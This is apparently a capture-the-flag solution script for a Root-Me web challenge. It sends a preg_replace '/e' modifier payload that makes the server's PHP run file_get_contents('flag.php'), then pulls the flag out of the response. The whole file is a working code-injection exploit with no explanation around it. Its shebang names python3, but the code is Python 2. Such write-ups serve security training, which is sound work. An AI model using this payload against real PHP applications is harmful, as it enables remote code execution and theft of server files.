#!/usr/bin/python3 env
import urllib2
import requests

url = "http://challenge01.root-me.org/web-serveur/ch37/"

s = requests.session()
r = s.get(url)
#print r.text

search = "/./e"
replace = "file_get_contents('flag.php')"
content = "."

payload = {'search' : search, 'replace' : replace, 'content': content}
out = s.post(url,data=payload)

flag = out.text.split("$flag=&quot;")[1].split("&quot;;")[0]

print flag